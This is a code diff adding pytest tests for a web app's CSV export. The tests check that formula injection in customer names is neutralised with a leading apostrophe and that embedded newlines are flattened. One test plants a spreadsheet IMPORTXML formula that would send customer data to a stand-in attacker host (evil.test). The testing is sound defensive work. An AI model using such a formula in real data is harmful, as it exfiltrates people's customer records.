@@ -12,6 +12,7 @@ import uuid
 from datetime import UTC, date, datetime, timedelta
 
 import pytest
+from sqlalchemy import select
 from sqlalchemy.ext.asyncio import async_sessionmaker, create_async_engine
 from sqlalchemy.pool import NullPool
 from starlette.testclient import TestClient
@@ -321,6 +322,59 @@ async def test_the_csv_survives_a_reason_containing_a_comma(client, sessions):
     assert all(len(row) == len(insights.CSV_COLUMNS) for row in rows)
     # Reasons are pipe-joined so a naive comma split can't break them apart.
     assert "," not in rows[1][reasons_index] or " | " in rows[1][reasons_index]
+
+
+async def test_the_csv_neutralizes_spreadsheet_formulas(client, sessions):
+    """Security regression: customer names arrive verbatim from the Stripe and
+    Square customer records, which the *end customer* types at checkout. An
+    unescaped leading "=" is evaluated on import by Google Sheets with no
+    warning, which would exfiltrate the owner's whole customer list. QUOTE_ALL
+    does not prevent this — spreadsheets strip the quotes, then parse.
+    """
+    await _seed(sessions, count=2)
+    payload = '=IMPORTXML("https://evil.test/?d="&CONCATENATE(A1:A99),"//a")'
+    async with sessions() as db:
+        customer = (await db.execute(select(Customer).limit(1))).scalars().one()
+        customer.first_name = payload
+        customer.last_name = ""
+        await db.commit()
+
+    body = client.get("/api/insights/export.csv").text
+    rows = list(csv.reader(io.StringIO(body)))
+    name_index = list(insights.CSV_COLUMNS).index("name")
+    names = [r[name_index] for r in rows[1:]]
+    injected = next(n for n in names if "IMPORTXML" in n)
+
+    # Defanged with a leading apostrophe, and the formula text is preserved so
+    # the owner can still see what the customer actually called themselves.
+    assert injected.startswith("'=")
+    assert not injected.startswith("=")
+    assert "IMPORTXML" in injected
+
+
+def test_ordinary_values_are_left_alone_by_the_csv_guard():
+    """The guard must not corrupt normal data — this file gets re-imported."""
+    assert insights._csv_safe("Maria Lopez") == "Maria Lopez"
+    assert insights._csv_safe("maria@example.com") == "maria@example.com"
+    assert insights._csv_safe("") == ""
+
+
+@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t"])
+def test_every_formula_prefix_is_defanged(prefix):
+    """The characters a spreadsheet treats as starting a formula. A leading
+    tab is included because some parsers trim it and re-expose what follows.
+    CR/LF are not in this list: they are flattened to spaces first, which
+    already makes the cell inert (see the next test).
+    """
+    assert insights._csv_safe(prefix + "SUM(A1)").startswith("'")
+
+
+def test_embedded_newlines_are_flattened():
+    """A CR/LF inside a cell can start a new row in some parsers."""
+    flattened = insights._csv_safe("a\r\nb")
+    assert "\r" not in flattened
+    assert "\n" not in flattened
+    assert flattened == "a  b"
 
 
 async def test_the_csv_can_be_filtered_by_segment(client, sessions):
